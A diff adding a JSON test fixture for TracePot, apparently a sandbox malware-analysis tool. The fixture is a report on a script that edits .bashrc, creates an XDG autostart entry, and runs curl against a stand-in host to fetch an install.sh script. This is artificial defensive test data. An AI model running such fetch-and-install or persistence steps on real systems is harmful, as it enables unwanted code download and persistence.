@@ -1,0 +1,418 @@
+{
+  "schema": "tracepot-report",
+  "schemaVersion": "1.0",
+  "application": {
+    "name": "TracePot",
+    "version": "0.1.0"
+  },
+  "analysisId": "tracepot-fixture-0001",
+  "disclaimer": "TracePot reports behavior observed inside its sandbox during a single, time-limited run. The absence of suspicious observations does not mean the input is safe: code can detect analysis environments, wait, depend on network responses, or act through channels that were not observed.",
+  "timing": {
+    "startedAt": "2026-01-01T12:00:00.000Z",
+    "finishedAt": "2026-01-01T12:00:01.500Z",
+    "durationSeconds": 1.5
+  },
+  "input": {
+    "fileName": "tracepot-fixture.sh",
+    "sha256": "0f1e2d3c4b5a69788796a5b4c3d2e1f00f1e2d3c4b5a69788796a5b4c3d2e1f0",
+    "sizeBytes": 512,
+    "kind": "shell-script",
+    "format": "shell script",
+    "interpreter": "sh",
+    "entryPoint": "/work/tracepot-fixture.sh",
+    "arguments": [],
+    "environmentKeys": [],
+    "archive": null
+  },
+  "sandbox": {
+    "backend": "bubblewrap",
+    "backendVersion": "bubblewrap 0.9.0",
+    "namespaces": [
+      "user",
+      "mount",
+      "pid",
+      "ipc",
+      "uts",
+      "net"
+    ],
+    "user": "unprivileged",
+    "sandboxUid": 1000,
+    "seccomp": {
+      "enabled": true,
+      "blocked": [
+        "bpf",
+        "keyctl",
+        "io_uring_setup"
+      ]
+    },
+    "nestedUserNamespacesDisabled": true,
+    "readOnlyPaths": [
+      "/usr",
+      "/etc"
+    ],
+    "writablePaths": [
+      "/home/tracepot",
+      "/tmp",
+      "/work"
+    ],
+    "hostWritablePaths": [
+      "/home/analyst/.cache/tracepot/runs/tracepot-fixture-0001/root/work"
+    ],
+    "limits": {
+      "timeoutSeconds": 120,
+      "memoryBytes": 2147483648,
+      "maxProcesses": 256,
+      "maxFileSizeBytes": 536870912,
+      "maxDiskBytes": 1073741824,
+      "maxOpenFiles": 1024
+    },
+    "limitNotes": [
+      "memory: RLIMIT_AS per process (virtual address space)"
+    ],
+    "tracer": {
+      "name": "strace",
+      "version": "strace -- version 6.8",
+      "enabled": true
+    },
+    "runningAsHostRoot": false
+  },
+  "networkPolicy": {
+    "mode": "isolated",
+    "description": "Private network namespace with only a loopback interface.",
+    "externalConnectivity": false,
+    "dnsResolution": false,
+    "observationMethod": "syscall-trace"
+  },
+  "execution": {
+    "terminationReason": "exited",
+    "exitCode": 0,
+    "signal": null,
+    "detail": "exited with status 0",
+    "executionSeconds": 0.42,
+    "stdoutExcerpt": "installing tracepot fixture\n",
+    "stderrExcerpt": "",
+    "stdoutBytes": 28,
+    "stderrBytes": 0,
+    "outputNote": "Captured output is untrusted program output."
+  },
+  "processes": [
+    {
+      "pid": 4100,
+      "ppid": null,
+      "startTime": 1767268800.1,
+      "endTime": 1767268800.52,
+      "executable": "/usr/bin/sh",
+      "execs": [
+        {
+          "timestamp": 1767268800.1,
+          "path": "/usr/bin/sh",
+          "argv": [
+            "/usr/bin/sh",
+            "/work/tracepot-fixture.sh"
+          ],
+          "outcome": "success",
+          "error": null
+        }
+      ],
+      "exitCode": 0,
+      "signal": null,
+      "terminatedAtTeardown": false,
+      "threadCount": 0
+    },
+    {
+      "pid": 4101,
+      "ppid": 4100,
+      "startTime": 1767268800.2,
+      "endTime": 1767268800.25,
+      "executable": "/usr/bin/curl",
+      "execs": [
+        {
+          "timestamp": 1767268800.201,
+          "path": "/usr/bin/curl",
+          "argv": [
+            "curl",
+            "-fsSL",
+            "https://updates.example.invalid/install.sh"
+          ],
+          "outcome": "success",
+          "error": null
+        }
+      ],
+      "exitCode": 6,
+      "signal": null,
+      "terminatedAtTeardown": false,
+      "threadCount": 0
+    }
+  ],
+  "events": [
+    {
+      "seq": 1,
+      "timestamp": 1767268800.15,
+      "pid": 4100,
+      "type": "file-write",
+      "syscall": "openat",
+      "path": "/home/tracepot/.bashrc",
+      "targetPath": null,
+      "detail": "O_WRONLY|O_CREAT|O_APPEND",
+      "outcome": "success",
+      "error": null,
+      "source": "syscall-trace",
+      "evidence": "observed"
+    },
+    {
+      "seq": 2,
+      "timestamp": 1767268800.16,
+      "pid": 4100,
+      "type": "file-write",
+      "syscall": "openat",
+      "path": "/home/tracepot/.config/autostart/tracepot-fixture.desktop",
+      "targetPath": null,
+      "detail": "O_WRONLY|O_CREAT|O_TRUNC",
+      "outcome": "success",
+      "error": null,
+      "source": "syscall-trace",
+      "evidence": "observed"
+    },
+    {
+      "seq": 3,
+      "timestamp": 1767268800.23,
+      "pid": 4101,
+      "type": "network-connect",
+      "syscall": "connect",
+      "path": "198.51.100.7:443",
+      "targetPath": null,
+      "detail": "tcp",
+      "outcome": "failed",
+      "error": "ENETUNREACH",
+      "source": "syscall-trace",
+      "evidence": "observed"
+    }
+  ],
+  "filesystemChanges": [
+    {
+      "path": "/home/tracepot/.bashrc",
+      "change": "modified",
+      "area": "home",
+      "aspects": [
+        "content",
+        "size"
+      ],
+      "before": {
+        "type": "file",
+        "mode": "0644",
+        "uid": 1000,
+        "gid": 1000,
+        "size": 41,
+        "mtimeNs": 1700000000000000000,
+        "sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+        "hashNote": null,
+        "linkTarget": null
+      },
+      "after": {
+        "type": "file",
+        "mode": "0644",
+        "uid": 1000,
+        "gid": 1000,
+        "size": 79,
+        "mtimeNs": 1767268800150000000,
+        "sha256": "2222222222222222222222222222222222222222222222222222222222222222",
+        "hashNote": null,
+        "linkTarget": null
+      },
+      "textDiff": "--- a/home/tracepot/.bashrc\n+++ b/home/tracepot/.bashrc\n@@ -1,1 +1,2 @@\n # ~/.bashrc (TracePot sandbox skeleton)\n+export PATH=\"$HOME/.local/bin:$PATH\"\n",
+      "textDiffTruncated": false,
+      "attributedPids": [
+        4100
+      ],
+      "notes": [],
+      "source": "filesystem-diff",
+      "evidence": "observed"
+    },
+    {
+      "path": "/home/tracepot/.config/autostart/tracepot-fixture.desktop",
+      "change": "created",
+      "area": "home",
+      "aspects": [],
+      "before": null,
+      "after": {
+        "type": "file",
+        "mode": "0644",
+        "uid": 1000,
+        "gid": 1000,
+        "size": 62,
+        "mtimeNs": 1700000000000000000,
+        "sha256": "3333333333333333333333333333333333333333333333333333333333333333",
+        "hashNote": null,
+        "linkTarget": null
+      },
+      "textDiff": null,
+      "textDiffTruncated": false,
+      "attributedPids": [
+        4100
+      ],
+      "notes": [],
+      "source": "filesystem-diff",
+      "evidence": "observed"
+    },
+    {
+      "path": "/tmp/tracepot-fixture.tmp",
+      "change": "created",
+      "area": "temporary",
+      "aspects": [],
+      "before": null,
+      "after": {
+        "type": "file",
+        "mode": "0600",
+        "uid": 1000,
+        "gid": 1000,
+        "size": 20480,
+        "mtimeNs": 1700000000000000000,
+        "sha256": "4444444444444444444444444444444444444444444444444444444444444444",
+        "hashNote": null,
+        "linkTarget": null
+      },
+      "textDiff": null,
+      "textDiffTruncated": false,
+      "attributedPids": [],
+      "notes": [],
+      "source": "filesystem-diff",
+      "evidence": "observed"
+    },
+    {
+      "path": "/work/old-config.txt",
+      "change": "deleted",
+      "area": "work",
+      "aspects": [],
+      "before": {
+        "type": "file",
+        "mode": "0644",
+        "uid": 1000,
+        "gid": 1000,
+        "size": 12,
+        "mtimeNs": 1700000000000000000,
+        "sha256": "5555555555555555555555555555555555555555555555555555555555555555",
+        "hashNote": null,
+        "linkTarget": null
+      },
+      "after": null,
+      "textDiff": null,
+      "textDiffTruncated": false,
+      "attributedPids": [
+        4100
+      ],
+      "notes": [],
+      "source": "filesystem-diff",
+      "evidence": "observed"
+    }
+  ],
+  "networkEvents": [
+    {
+      "timestamp": 1767268800.23,
+      "pid": 4101,
+      "kind": "connect",
+      "protocol": "tcp",
+      "family": "ipv4",
+      "address": "198.51.100.7",
+      "port": 443,
+      "hostname": null,
+      "outcome": "failed",
+      "error": "ENETUNREACH",
+      "evidence": "observed",
+      "source": "syscall-trace",
+      "detail": "no route: the sandbox network namespace has no external interface"
+    },
+    {
+      "timestamp": 1767268800.201,
+      "pid": 4101,
+      "kind": "inferred-destination",
+      "protocol": "https",
+      "family": null,
+      "address": null,
+      "port": null,
+      "hostname": "updates.example.invalid",
+      "outcome": "unknown",
+      "error": null,
+      "evidence": "inferred",
+      "source": "command-line",
+      "detail": "URL in the command line of /usr/bin/curl: https://updates.example.invalid/install.sh"
+    }
+  ],
+  "persistence": [
+    {
+      "category": "shell-startup",
+      "scope": "user",
+      "path": "/home/tracepot/.bashrc",
+      "action": "modified",
+      "outcome": "applied-in-sandbox",
+      "ruleId": "shell-startup-user",
+      "description": "user shell or session startup file (runs at login or when a shell starts)",
+      "evidence": "inferred",
+      "basis": [
+        "filesystem-diff",
+        "syscall-trace"
+      ],
+      "pids": [
+        4100
+      ]
+    },
+    {
+      "category": "xdg-autostart",
+      "scope": "user",
+      "path": "/home/tracepot/.config/autostart/tracepot-fixture.desktop",
+      "action": "created",
+      "outcome": "applied-in-sandbox",
+      "ruleId": "xdg-autostart-user",
+      "description": "XDG autostart entry (runs when the user's desktop session starts)",
+      "evidence": "inferred",
+      "basis": [
+        "filesystem-diff",
+        "syscall-trace"
+      ],
+      "pids": [
+        4100
+      ]
+    }
+  ],
+  "resourceLimitEvents": [],
+  "hostIntegrity": {
+    "performed": true,
+    "pathsChecked": [
+      "/home/analyst/.bashrc",
+      "/etc/systemd/system"
+    ],
+    "entriesCompared": 120,
+    "changes": [],
+    "note": "No changes were detected in the checked host persistence locations during the analysis window."
+  },
+  "statistics": {
+    "traceLinesParsed": 512,
+    "traceLinesMalformed": 0,
+    "traceBytes": 65536,
+    "eventsRecorded": 3,
+    "eventsDropped": 0,
+    "readOnlyOpens": 220,
+    "entriesBefore": 480,
+    "entriesAfter": 482,
+    "bytesHashed": 360000
+  },
+  "diagnostics": [
+    {
+      "severity": "warning",
+      "kind": "warning",
+      "code": "trace",
+      "message": "the end of some processes was not observed (trace ended first)"
+    },
+    {
+      "severity": "info",
+      "kind": "limitation",
+      "code": "shared-kernel",
+      "message": "The sandbox shares the host kernel."
+    },
+    {
+      "severity": "info",
+      "kind": "limitation",
+      "code": "network-isolated",
+      "message": "Network access was blocked."
+    }
+  ]
+}
